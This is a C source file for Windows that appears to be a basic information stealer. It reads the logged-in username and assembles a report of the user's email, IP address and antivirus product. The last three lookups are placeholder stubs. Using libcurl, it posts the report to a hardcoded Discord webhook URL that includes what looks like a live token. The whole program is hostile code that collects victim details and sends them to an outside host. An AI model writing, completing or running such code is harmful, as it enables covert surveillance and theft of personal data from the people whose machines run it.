#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <curl/curl.h>

// Function to send content to the Discord webhook
void send_to_discord(const char *webhook, const char *message) {
    CURL *curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();

    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, webhook);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, message);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
}

// Function to retrieve the full name of the user
char* get_full_name() {
    char* full_name = (char*)malloc(MAX_PATH * sizeof(char));
    DWORD size = MAX_PATH;
    GetUserName(full_name, &size);
    return full_name;
}

// Function to retrieve the email address of the user
char* get_email() {
    // Dummy implementation for demonstration
    return "example@example.com";
}

// Function to retrieve IP information
char* get_ip_information() {
    // Dummy implementation for demonstration
    return "IP: 192.168.1.1";
}

// Function to retrieve antivirus software information
char* get_antivirus_solution() {
    // Dummy implementation for demonstration
    return "Antivirus: Windows Defender";
}

// Function to gather and send user information
void user_information(const char *webhook) {
    char message[1024]; // Adjust the size as needed

    // Retrieve user information
    char *full_name = get_full_name();
    char *email = get_email();
    char *ip_information = get_ip_information();
    char *antivirus_solution = get_antivirus_solution();

    // Construct the message with user information
    sprintf(message, "Full Name: %s\nEmail: %s\nIP Information: %s\nAntivirus Solution: %s\n", full_name, email, ip_information, antivirus_solution);

    // Send the message to the Discord webhook using send_to_discord()
    send_to_discord(webhook, message);

    // Free dynamically allocated memory
    free(full_name);
}

int main() {
    const char *webhook = "https://discord.com/api/webhooks/1214668283291246612/u2BvIsoawRlcmVn_zRqk2hyTr2iQVDV2HZvTsKLi85s5jmLk6JqwgT1Ss_Gr2zTPg02w";

    // Call user_information() to gather and send user information
    user_information(webhook);

    return 0;
}
